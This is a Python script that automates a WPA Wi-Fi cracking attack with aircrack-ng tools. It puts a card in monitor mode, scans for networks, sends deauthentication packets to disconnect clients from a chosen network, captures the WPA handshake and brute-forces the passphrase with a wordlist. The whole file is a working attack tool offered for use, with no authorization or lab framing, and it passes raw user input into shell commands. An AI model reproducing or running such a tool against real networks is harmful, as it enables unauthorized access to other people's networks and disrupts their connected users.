import os,time
while True:
	try:
		def mainScreen():
			print ("""
          _______ _________ _                   _______  _______ _________          _ 
|\     /|(  ___  )\__   __/( \        |\     /|(  ____ \(  ____ \\__   __/|\     /|( )
| )   ( || (   ) |   ) (   | (        | )   ( || (    \/| (    \/   ) (   ( \   / )| |
| (___) || (___) |   | |   | |        | | _ | || (__    | (_____    | |    \ (_) / | |
|  ___  ||  ___  |   | |   | |        | |( )| ||  __)   (_____  )   | |     \   /  | |
| (   ) || (   ) |   | |   | |        | || || || (            ) |   | |      ) (   (_)
| )   ( || )   ( |___) (___| (____/\  | () () || (____/\/\____) |   | |      | |    _ 
|/     \||/     \|\_______/(_______/  (_______)(_______/\_______)   )_(      \_/   (_)
                                                                                      
""")
			print("HI, welcome to aircrack-ng made easy")
			print("Please read everything that appears at the bottom")
			print("Thanks for using this program")
			index = input("What card shall I put in monitor mode? wlan0 [enter 0] wlan1 [enter 1] etc >>")
			query = ("wlan"+"%s" %(index))
			query = str(query)
			os.system("airmon-ng start %s" %(query))
			print("If you dont see an error that means that %s is started, time to get crackin'" %(query))
			print("airodump will run after you press enter, let it run till you find your target network then CTRL+C to continue the process")
			input("Press Enter to continue after reading the above [CTRL+C after your target network appears]>>")
			os.system("airodump-ng -a %smon" %(query)) 
			print("Ok, you may need to scroll up if you don't see your network but all I need is a few things from you")
			b = input("Please tell me the name of the file you want [no spaces]>>")
			b = str(b)
			c = input("Now, tell me the (copy/paste) channel of the network [no spaces]>>")
			c = str(c)
			d = input("Finally tell me the (copy/paste) bssid of the network [no spaces]>>")
			d = str(d)
			if b and c and d != "":
				print("remember you can always exit by pressing CTRL+C")
				e = input("How many times shall I send a deauth? [kick them off] >>")
				e = str(e)
				input("REMEMBER TO HIT CTRL+C ONCE YOU SEE [WPA HANDSHAKE] AT THE TOP RIGHT!! THIS IS VITAL!! [press enter]>>")
				os.system("iwconfig %smon channel %s" %(query,c))
				os.system("xterm $HOLD -title 'DEAUTHING'  $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' $TOPLEFTBIG -bg '#FFFFFF' -fg '#000000' -e aireplay-ng -0 %s -a %s %smon;airodump-ng -w %s -c %s --bssid %s %smon" %(e,d,query,b,c,d,query))
				print("If you saw [wpa handshake] at the top right,then now its time to crack the handshake.")
				print("First make sure you have a wordlist which has the password in it ")
				print("Once you download or locate one press enter")
				print("Hopefully the password will be in there or put it in there")
				f = input("Drag the wordlist on the terminal, literally [use file manager] >>")
				f = str(f)
				print("Ok, ready? press enter to start cracking")
				print("If nothing is found then ctrl+c and try again")
				input("[press enter]>>")
				os.system("aircrack-ng %s-01.cap -w %s" %(b,f))
				input("IF KEY IS FOUND WRITE IT DOWN AND PRESS ENTER>>")
				os.system("airmon-ng stop %smon" %(query))
				os.system("service network-manager restart")
				os.system("service wpa_supplicant start")
				os.system("clear")
				print("CONGRATS IF YOU FIND THE PSK!")
				print("GOODBYE!")
				os._exit(1)
			else:
				print("You missed something, try again")
				mainScreen()
		mainScreen()
	except(KeyboardInterrupt,EOFError):
		os._exit(1)
